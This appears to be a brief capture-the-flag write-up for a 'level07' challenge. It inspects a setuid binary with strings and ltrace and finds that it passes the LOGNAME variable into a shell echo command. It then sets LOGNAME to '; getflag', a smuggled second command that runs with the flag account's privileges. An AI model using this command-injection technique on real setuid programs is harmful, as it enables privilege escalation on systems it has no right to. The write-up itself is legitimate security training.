-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07

./level07
level07

strings level07
[...]
getenv
setresuid
system
getegid
geteuid
[...]
[^_] (?)
LOGNAME
/bin/echo %s 
;*2$"
[...]


ltrace level07
getenv("LOGNAME")                                               = "level07"

	change LOGNAME ?

export LOGNAME="; getflag"
will now execute getflag with flag07 permissions, still the same thing as before with setuid
